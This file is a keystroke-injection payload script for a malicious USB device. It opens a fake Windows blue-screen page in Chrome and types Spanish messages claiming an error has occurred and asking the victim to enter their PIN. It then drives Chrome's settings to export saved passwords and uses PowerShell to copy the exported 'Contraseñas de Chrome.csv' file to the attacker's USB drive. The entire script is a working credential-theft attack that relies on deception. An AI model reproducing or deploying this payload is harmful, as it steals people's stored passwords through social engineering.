layout("us");
press("GUI r");
delay(100);
type ("chrome\n");
delay(500);
type("https://www.ravbug.com/bsod/bsod10/");
press("Enter");
delay(500);
press("TAB");
delay(100);
for(var i=0; i<5; i++){
	press("DOWN");
}
press("shift down");
type("UN ERROR HA OCURRIDO VAMOS A INTENTAR SOLUCIONARLO, LEA LAS INSTRUCCIONES Y PULSE BLOCK NUM CUANDO ESTE LISTO");
press("RIGHT");
delay("100")
press("shift down");
type(" Introduzca el pin cuando se le solicite e inmediatamente despues escriba EN MAYUSCULAS el título del documento, despues tendrá más instrucciones");

waitLEDRepeat (NUM,1,100,120000);

press("CTRL N");
delay(100);
press("ALT F");
delay(100);
for(var i=0; i<17; i++){
	press("DOWN");
}
press("ENTER");
delay(500);
press("TAB");
press ("DOWN");
delay (100)
press ("ENTER");
delay(100);
press ("TAB");
press ("ENTER");
delay(100);
for(var i=0; i<9; i++){
	press("TAB");
}
press ("ENTER");
delay(100);


press ("DOWN"); 
press ("ENTER");
press("ENTER");
waitLEDRepeat (CAPS,1,100);
press ("ENTER");
press("GUI r");
delay(500) 
type("powershell\n")
delay(1000)
 
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'temp' } | select name\n")

type('copy "Documents/Contraseñas de Chrome.csv"'+ " $usbpath.name; exit\n")
